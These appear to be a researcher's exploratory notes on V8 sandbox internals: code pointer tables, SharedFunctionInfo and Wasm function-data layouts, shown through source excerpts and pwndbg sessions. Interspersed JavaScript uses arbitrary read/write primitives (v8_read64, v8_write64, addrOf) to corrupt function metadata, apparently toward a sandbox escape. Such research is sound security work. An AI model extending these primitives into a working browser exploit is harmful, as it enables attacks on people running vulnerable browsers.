
How the sandbox decoder pointers?

- [External pointer](#external-pointer)
- [Code Pointer](#code-pointer)


## external pointer

## code pointer

```js


// src/sandbox/code-pointer-table-inl.h:24

void CodePointerTableEntry::MakeCodePointerEntry(Address code,
                                                 Address entrypoint,
                                                 CodeEntrypointTag tag,
                                                 bool mark_as_alive) {
//....
  if (mark_as_alive) code |= kMarkingBit;
  entrypoint_.store(entrypoint ^ tag, std::memory_order_relaxed);
  code_.store(code, std::memory_order_relaxed);
}
/// ==================================================
pwndbg> p code
$2 = 0x3440024f3ec

// 
pwndbg> p code
$3 = 0x3440024f428
pwndbg> p code
$4 = 0x3440024f464

v8::internal::CodePointerTableEntry::MakeCodePointerEntry (this=0x7fff90010050, code=code@entry=0x3440024f518, entrypoint=entrypoint@entry=0x0, tag=tag@entry=v8::internal::kDefaultCodeEntrypointTag, mark_as_alive=0x0)
/// ====================================================================

// code table
pwndbg> x/30gx 0x7fff90010030
0x7fff90010030:	0x00ff7fff7f4819c0	0x000003440024f4a0
0x7fff90010040:	0x00ff7fff7f482180	0x000003440024f4dc
0x7fff90010050:	0x00ff7fff7f482340	0x000003440024f518

$6 = (std::__Cr::atomic<unsigned long> *) 0x7fff90010008

//===============
0x1a9700283979: [Map] in OldSpace
 - map: 0x1a97002816d9 <MetaMap (0x1a9700281729 <NativeContext[295]>)>
 - type: JS_TYPED_ARRAY_TYPE
```

Offset `0x298d0b` is a magic... When I changed data at JSTypedArray's elements + `0x298d0b` => the program decodes function call is fail
```js
function foo() {
    const v11 = new Int8Array(150);
    Object(v11,...v11,v11);
  }
  
  foo();
  const dummy = new Int8Array(150);
  %DebugPrint(dummy);
  %SystemBreak();
  
  foo();
/// ================================================
DebugPrint: 0x1a970004a3a9: [JSTypedArray]
 - map: 0x1a9700283979 <Map[76](INT8ELEMENTS)> [FastProperties]
 - prototype: 0x1a9700283a0d <Object map = 0x1a97002839a1>
 - elements: 0x1a9700000ec1 <ByteArray[0]> [INT8ELEMENTS]
/// ================================================
pwndbg> x/20wx 0x1a9700000ec1+0x298d0b
0x1a9700299bcc:	0x00299aed	0x00281729	0x00048e4d	0x0004a3a9
0x1a9700299bdc:	0x00281ea1	0x00000725	0x00000725	0x00209801
pwndbg> set *0x1a9700299bcc=0xfffffff
pwndbg> c
Continuing.

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.
v8::internal::HeapObject::map_word (this=0x7fffffffd218, cage_base=..., tag=...) at ../../src/objects/objects-inl.h:1271
1271	  return MapField::Relaxed_Load_Map_Word(cage_base, *this);
//==========================================================
pwndbg> bt
#0  v8::internal::HeapObject::map_word (this=0x7fffffffd218, cage_base=..., tag=...) at ../../src/objects/objects-inl.h:1271
#1  v8::internal::HeapObject::map (this=0x7fffffffd218, cage_base=...) at ../../src/objects/objects-inl.h:1098
#2  v8::internal::HeapObject::HeapObjectPrint (this=0x7fffffffd218, os=...) at ../../src/diagnostics/objects-printer.cc:127
#3  0x00007ffff6126e26 in v8::internal::Print<(v8::internal::HeapObjectReferenceType)0, unsigned long> (ptr=..., os=...) at ../../third_party/libc++/src/include/ostream:787
#4  0x00007ffff60371b9 in v8::internal::CheckObjectType (raw_value=0x1a97ffffffff, raw_type=<optimized out>, raw_location=0x1a97000202d5) at ../../src/objects/object-type.cc:78
#5  0x00007fff7f5111f4 in ?? ()
#6  0x00007fffffffd3a8 in ?? ()

```

```js
let addr2 = v8_read64(store_sfi-1n+0x30n) & 0xffffffffn;
let store_function_data = v8_read64(addr2+7n); // function_data 

/// =========================================================================
// https://github.com/lanleft/v8/blob/master/v8/src/builtins/builtins-api.cc#L232
V8_WARN_UNUSED_RESULT static Tagged<Object>
HandleApiCallAsFunctionOrConstructorDelegate(Isolate* isolate,
                                             bool is_construct_call,
                                             BuiltinArguments args) {
  Handle<Object> receiver = args.receiver();
  Tagged<Object> handler =
      constructor->shared()->api_func_data()->GetInstanceCallHandler(); //function_data+0x28
// ===============================================================            
}

let v8_heap_base = v8_read64(0x48) - 0x40000n;
let store_sfi = v8_read64(addrOf(store) + 0x10) & 0xffffffffn;
// let load_sfi = v8_read64(addrOf(load) + 0x10) & 0xffffffffn;
console.log("v8_heap_base: 0x" + v8_heap_base.toString(16));
console.log("store_sfi: 0x" + store_sfi.toString(16));
// console.log("load_sfi: 0x" + load_sfi.toString(16));

// for (let i =0; i<40; i++){
//     v8_write64(store_sfi-1n+BigInt(i)*4n, 0x41414141n + BigInt(i));
// }

// v8_write64(store_sfi-1n+0x30n, 0x41414145n); 

/*
shared_info: 0x2e720029a715
pwndbg> x/10wx 0x2e720029a715-1+0x30
0x2e720029a744:	0x002926fd	0x00000725	0x00000725	0x002bf801
0x2e720029a754:	0x0029a715	0x00281729	0x001400a9	0x0029a6a5
// ==============================================================

RCX  0x2e72002926fd
    movzx  edx, word ptr [rcx + 7]
pwndbg> x/10wx 0x2e72002926fd-1
0x2e72002926fc:	0x002816d9	0x2e070707	0x0d020811	0x084013ff

   0x7fff7f484294    lea    r10d, [rdx - 0x811]
   0x7fff7f48429b    cmp    r10d, 0xf
   0x7fff7f48429f    jbe    0x7fff7f482d00                <0x7fff7f482d00>

*/

let addr2 = v8_read64(store_sfi-1n+0x30n) & 0xffffffffn;
let store_function_data = v8_read64(addr2+7n); // function_data 
/* 
  Tagged<Object> handler =
      constructor->shared()->api_func_data()->GetInstanceCallHandler();
*/

// let addr3 = v8_read64(load_sfi-1n+0x30n) & 0xffffffffn;
// let original2 = v8_read64(addr3+7n);

// v8_write64(addr2+7n, original + 0x20n);
// console.log(original2.toString(16));
// console.log(original.toString(16));
// console.log(v8_read64(addr2+7n).toString(16));

%SystemBreak();
store(1, 0x42);
// load(1);

```

## Shared Function Info


```js
pwndbg> p *this
$16 = {
  <v8::internal::TorqueGeneratedSharedFunctionInfo<v8::internal::SharedFunctionInfo, v8::internal::HeapObject>> = {
    <v8::internal::HeapObject> = {
      <v8::internal::TaggedImpl<1, unsigned long>> = {
        static kIsFull = 0x1,
        static kCanBeWeak = 0x0,
        ptr_ = 0x6d60029a971
      }, 
      members of v8::internal::HeapObject:
      static kMapOffset = 0x0,
      static kHeaderSize = 0x4
    }, 
    members of v8::internal::TorqueGeneratedSharedFunctionInfo<v8::internal::SharedFunctionInfo, v8::internal::HeapObject>:
    static kTrustedFunctionDataOffset = 0x4,
    static kTrustedFunctionDataOffsetEnd = 0x7,
    static kStartOfWeakFieldsOffset = 0x8,
    static kFunctionDataOffset = 0x8,
    static kFunctionDataOffsetEnd = 0xb,
    static kEndOfWeakFieldsOffset = 0xc,
    static kStartOfStrongFieldsOffset = 0xc,
    static kNameOrScopeInfoOffset = 0xc,
    static kNameOrScopeInfoOffsetEnd = 0xf,
    static kOuterScopeInfoOrFeedbackMetadataOffset = 0x10,
    static kOuterScopeInfoOrFeedbackMetadataOffsetEnd = 0x13,
    static kScriptOffset = 0x14,
    static kScriptOffsetEnd = 0x17,
    static kEndOfStrongFieldsOffset = 0x18,
    static kLengthOffset = 0x18,
    static kLengthOffsetEnd = 0x19,
    static kFormalParameterCountOffset = 0x1a,
    static kFormalParameterCountOffsetEnd = 0x1b,
    static kFunctionTokenOffsetOffset = 0x1c,
    static kFunctionTokenOffsetOffsetEnd = 0x1d,
    static kExpectedNofPropertiesOffset = 0x1e,
    static kExpectedNofPropertiesOffsetEnd = 0x1e,
    static kFlags2Offset = 0x1f,
    static kFlags2OffsetEnd = 0x1f,
    static kFlagsOffset = 0x20,
    static kFlagsOffsetEnd = 0x23,
    static kFunctionLiteralIdOffset = 0x24,
    static kFunctionLiteralIdOffsetEnd = 0x27,
    static kUniqueIdOffset = 0x28,
    static kUniqueIdOffsetEnd = 0x2b,
    static kAgeOffset = 0x2c,
    static kAgeOffsetEnd = 0x2d,
    static kPaddingOffset = 0x2e,
    static kPaddingOffsetEnd = 0x2f,
    static kHeaderSize = 0x4,
    static kSize = 0x30
  }, 
  members of v8::internal::SharedFunctionInfo:
  static kNoSharedNameSentinel = {
    <v8::internal::TaggedImpl<1, unsigned long>> = {
      static kIsFull = 0x1,
      static kCanBeWeak = 0x0,
      ptr_ = 0x0
    }, <No data fields>},
  static kEntriesStart = 0x0,
  static kContextOffset = 0x0,
  static kCachedCodeOffset = 0x1,
  static kEntryLength = 0x2,
  static kInitialLength = 0x2,
  static kNotFound = 0xffffffff,
  static kAgeSize = 0x2,
  static kMaxAge = 0xffff,
  static kMaximumFunctionTokenOffset = 0xfffe,
  static kFunctionTokenOutOfRange = 0xffff
}
/// ===================================================================


DEF_GETTER(SharedFunctionInfo, HasBaselineCode, bool) {
#ifdef V8_ENABLE_SANDBOX
  // Micro-optimization: we just need to look at the indirect pointer handle
  // stored in the trusted_function_data field and check if that is a code
  // pointer handle.
  IndirectPointerHandle handle = trusted_function_data_handle(kAcquireLoad); // sfi+0x4
  ...}
/// [function_data+0x18]->wasm_instance
PROTECTED_POINTER_ACCESSORS(WasmExportedFunctionData, instance_data,
                            WasmTrustedInstanceData,
                            kProtectedInstanceDataOffset)// 0x18

// v8/src/wasm/wasm-objects-inl.h:384
///[function_data+0x8]->code_offset
CODE_POINTER_ACCESSORS(WasmFunctionData, wrapper_code, kWrapperCodeOffset)//+0x8

// Data layer: https://source.chromium.org/chromium/chromium/src/+/main:out/linux-Debug/gen/v8/torque-generated/src/wasm/wasm-objects-tq.inc;l=438;drc=adb007db011fe274af8fc2914a211424c86cd669

template<class D, class P>
int TorqueGeneratedWasmExportedFunctionData<D, P>::function_index() const {
  int value = TaggedField<Smi>::load(*this, kFunctionIndexOffset).value();
  return value;}// +0xc
// ======================================================================


pwndbg> p data
$9 = {
  <v8::internal::TaggedImpl<1, unsigned long>> = {
    static kIsFull = 0x1,
    static kCanBeWeak = 0x0,
    ptr_ = 0x3a9a002815c5
// ======================================================================
pwndbg> ni
0x00007ffff60ed4c5	384	CODE_POINTER_ACCESSORS(WasmFunctionData, wrapper_code, kWrapperCodeOffset)
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────────────────────────────────
 RAX  0x2bf801
 RBX  0x5555555fd000 —▸ 0x31ed00000000 ◂— 0x40940
 RCX  0x0
 RDX  0x5555555fd000 —▸ 0x31ed00000000 ◂— 0x40940
 RDI  0x7fffffffca90 —▸ 0x2e23000404ed ◂— 0x10040080000001d
 RSI  0x8
 R8   0x0
 R9   0x7fffffffc960 ◂— 0x1
 R10  0x7ffff3211a9c ◂— '_ZN2v88internal24ReadIndirectPointerFieldILNS0_18IndirectPointerTagE4611404543450677248EEENS0_6TaggedINS0_6ObjectEEEmNS0_17IsolateForSandboxE'
 R11  0x7ffff54c8210 (v8::internal::Tagged<v8::internal::Object> v8::internal::ReadIndirectPointerField<(v8::internal::IndirectPointerTag)4611404543450677248>(unsigned long, v8::internal::IsolateForSandbox)) ◂— push rbp
 R12  0x1
 R13  0x7ffff7f69a28 (v8::internal::MainCage::base_) —▸ 0x31ed00000000 ◂— 0x40940
 R14  0x7fffffffcae8 —▸ 0x31ed0029a971 ◂— 0xfe0040080000000d /* '\r' */
 R15  0x2e23000404ed ◂— 0x10040080000001d
 RBP  0x7fffffffcac0 —▸ 0x7fffffffcb10 —▸ 0x7fffffffcbc0 —▸ 0x7fffffffcc50 —▸ 0x7fffffffcd60 ◂— ...
 RSP  0x7fffffffca90 —▸ 0x2e23000404ed ◂— 0x10040080000001d
*RIP  0x7ffff60ed4c5 (v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+549) ◂— call 0x7ffff7d84450
───────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────────────────────────────────
   0x7ffff60ed4b1 <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+529>    test   eax, eax
   0x7ffff60ed4b3 <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+531>    je     v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+1461                <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+1461>
 
   0x7ffff60ed4b9 <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+537>    lea    rdi, [rbp - 0x30]
   0x7ffff60ed4bd <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+541>    mov    esi, 8
   0x7ffff60ed4c2 <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+546>    mov    rdx, rbx
 ► 0x7ffff60ed4c5 <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+549>    call   v8::internal::Tagged<v8::internal::ExposedTrustedObject> v8::internal::HeapObject::ReadTrustedPointerField<(v8::internal::IndirectPointerTag)50102545854496768>(unsigned long, v8::internal::IsolateForSandbox) const@plt                <v8::internal::Tagged<v8::internal::ExposedTrustedObject> v8::internal::HeapObject::ReadTrustedPointerField<(v8::internal::IndirectPointerTag)50102545854496768>(unsigned long, v8::internal::IsolateForSandbox) const@plt>
        rdi: 0x7fffffffca90 —▸ 0x2e23000404ed ◂— 0x10040080000001d
        rsi: 0x8
        rdx: 0x5555555fd000 —▸ 0x31ed00000000 ◂— 0x40940
        rcx: 0x0
 
   0x7ffff60ed4ca <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+554>    mov    r15, rax
   0x7ffff60ed4cd <v8::internal::SharedFunctionInfo::GetCode(v8::internal::Isolate*) const+557>    test   r15b, 1

 => *RAX  0x31ed00265afd ◂— 0x2bf80100000d /* '\r' */

pwndbg> nextret
```


```js
console.log(v8_read64(store_sfi - 7n).toString(16));
v8_write32(store_sfi - 7n, 0xffffffff);
console.log(v8_read64(store_sfi - 7n).toString(16));
// ===========================================================
pwndbg> bt
#0  v8::internal::HeapObject::HeapObjectPrint (this=0x7fffffffd168, os=...) at ../../src/diagnostics/objects-printer.cc:127
#1  0x00007ffff6126d76 in v8::internal::Print<(v8::internal::HeapObjectReferenceType)0, unsigned long> (ptr=..., os=...) at ../../third_party/libc++/src/include/ostream:787
#2  0x00007ffff6037109 in v8::internal::CheckObjectType (raw_value=0x9d40029a945, raw_type=<optimized out>, raw_location=0x9d4000202d5) at ../../src/objects/object-type.cc:78
```



